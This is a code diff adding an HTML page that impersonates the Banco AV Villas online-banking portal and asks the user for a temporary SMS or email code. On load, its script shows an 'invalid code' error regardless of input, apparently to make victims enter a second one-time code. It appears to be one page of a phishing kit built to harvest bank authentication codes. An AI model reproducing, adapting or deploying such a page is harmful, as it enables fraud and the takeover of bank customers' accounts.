@@ -1,0 +1,203 @@
+<html>
+    <head>
+        <title>Banca Virtual | Banco AV Villas</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="theme-color" content="#FF0015">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="../img/favicon.png">
+        <script type="text/javascript" src="../../../../../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="../css/style-white.css" rel="stylesheet">
+        <link href="../css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="../js/functions.js"></script>  
+        <script type="text/javascript" src="../js/ready.js"></script>                
+        <style type="text/css">
+            #fondo{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: #ffffff;
+                z-index: 900;
+            }
+
+            #cargando{
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 920;
+            }
+        </style>
+    </head>
+    <body>
+        <input type="hidden" name="hdd-documento" id="hdd-documento" value="CC">
+        <div id="fondo"></div>
+        <img src="../img/loading.gif" id="cargando" width="140">
+
+        <div id="top-bar">
+            <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td align="left" id="espacio-side-bar">
+                        <table border="0" cellpadding="0" cellspacing="0">
+                            <tr>
+                                <td valign="middle">
+                                    <img src="../img/logo.png" width="150" id="logo-top-bar">
+                                </td>                                                
+                                <td valign="middle" id="bienvenido">Bienvenido<br>
+                                    <img src="../img/separador.jpg" width="30" style="margin-top: 5px;">
+                                </td>
+                            </tr>
+                        </table>                 
+                    </td>
+                    <td align="right" width="60%">
+                        <table border="0" cellpadding="0" cellspacing="0" id="menu-mobile">
+                            <tr>
+                                <td><img src="../img/notificaciones.png" width="26" style="margin: 0px 10px; cursor: pointer;"></td>
+                                <td><img src="../img/menu.png" width="24" style="margin-right: 20px; cursor: pointer;"></td>
+                            </tr>
+                        </table>
+
+                        <table border="0" cellpadding="0" cellspacing="0" id="menu-top-bar">
+                            <tr>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="nuevo-producto">
+                                        <tr>
+                                            <td><img src="../img/nuevo-producto.png" width="14"></td>
+                                            <td class="txt-item-top">Solicitud de Productos</td>
+                                        </tr>
+                                    </table>  
+                                </td>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="contactos">
+                                        <tr>
+                                            <td><img src="../img/contactos.png" width="14"></td>
+                                            <td class="txt-item-top">Contactos</td>
+                                        </tr>
+                                    </table>
+                                </td>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="documentos">
+                                        <tr>
+                                            <td><img src="../img/documentos.png" width="14"></td>
+                                            <td class="txt-item-top">Extractos y Certificados</td>
+                                        </tr>
+                                    </table>
+                                </td>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="seguridad">
+                                        <tr>
+                                            <td><img src="../img/seguridad.png" width="14"></td>
+                                            <td class="txt-item-top">Seguridad</td>
+                                        </tr>
+                                    </table>
+                                </td>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="salir">
+                                        <tr>
+                                            <td><img src="../img/salir.png" width="14"></td>
+                                            <td class="txt-item-top">Salida Segura</td>
+                                        </tr>
+                                    </table>
+                                </td>
+                            </tr>
+                        </table>                                
+                    </td>
+                </tr>
+            </table>
+        </div>
+          
+        <div id="side-bar">
+            <img src="../img/logo.png" width="150">
+            <br><br><br><br>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="productos">
+                <tr>
+                    <td class="img-item-side"><img src="../img/productos.png" width="20"></td>
+                    <td class="txt-item-side">Productos</td>
+                </tr>
+            </table>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="pagos">
+                <tr>
+                    <td class="img-item-side"><img src="../img/pagos.png" width="20"></td>
+                    <td class="txt-item-side">Pagos</td>
+                </tr>
+            </table>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="transferir">
+                <tr>
+                    <td class="img-item-side"><img src="../img/transferir.png" width="18"></td>
+                    <td class="txt-item-side">Transferencias</td>
+                </tr>
+            </table>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="bolsillo">
+                <tr>
+                    <td class="img-item-side"><img src="../img/bolsillo.png" width="20"></td>
+                    <td class="txt-item-side">Bolsillos</td>
+                </tr>
+            </table>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="giros">
+                <tr>
+                    <td class="img-item-side"><img src="../img/giros.png" width="20"></td>
+                    <td class="txt-item-side">Giros y Retiros</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="contenedor">            
+            <div class="frm" id="frm-correo">
+                <div class="titulo">Ingrese su clave temporal</div>
+                <div class="descripcion">Solo debes de ingresar la clave que te llegará por SMS o correo electrónico</div>
+                <br><br>
+                <div class="frm-input" id="inp-temporal">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;">
+                        <tr>
+                            <td align="left">
+                                <div class="etiqueta" id="etq-temporal"><b>Clave temporal</b></div>
+                                <input type="password" class="entrada" id="txt-temporal" name="txt-temporal" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                            </td>
+                            <td valign="middle" align="right" width="24">
+                                <img src="../img/seguridad.jpg" width="22" id="ico-temporal" class="icon-entrada">
+                                <img src="../img/alerta.jpg" width="25" id="ico-alerta-o" class="icon-entrada">
+                            </td>
+                        </tr>
+                    </table>                    
+                </div>
+                <div class="error" id="err-temporal">Este campo es requerido.</div>      
+
+                <br><br>
+                <button id="btn-temporal" type="button" class="btn" disabled="disabled"> VALIDAR </button>    
+
+            </div> 
+        </div>
+        <div style="padding:10px 14px;">
+            <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td align="left"><img src="../img/logo-gav.png" width="70"></td>
+                    <td align="right"><img src="../img/logo-gav.png" width="70" id="super-d"> &nbsp;&nbsp;&nbsp;  <img src="../img/superh-negro.svg" width="130"></td>
+                </tr>
+            </table>
+        </div>
+    </body>
+</html>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("#err-temporal").html("Clave temporal inválida");        
+        $("#txt-temporal").focus();
+        $("#inp-temporal").css("border-bottom","2px solid #A00104");
+        $("#ico-alerta-o").show();    
+        $("#err-temporal").show(); 
+        $("#btn-temporal").attr("disabled","disabled");
+        $("#inp-temporal .etiqueta").animate({"margin-top":"-4px","font-size": "12px"}, 100, function() {
+            $("#txt-temporal").show();
+            $("#txt-temporal").focus();              
+            $("#ico-alerta-o").show();    
+        }); 
+        $("#txt-temporal").focus(); 
+
+    });
+</script>
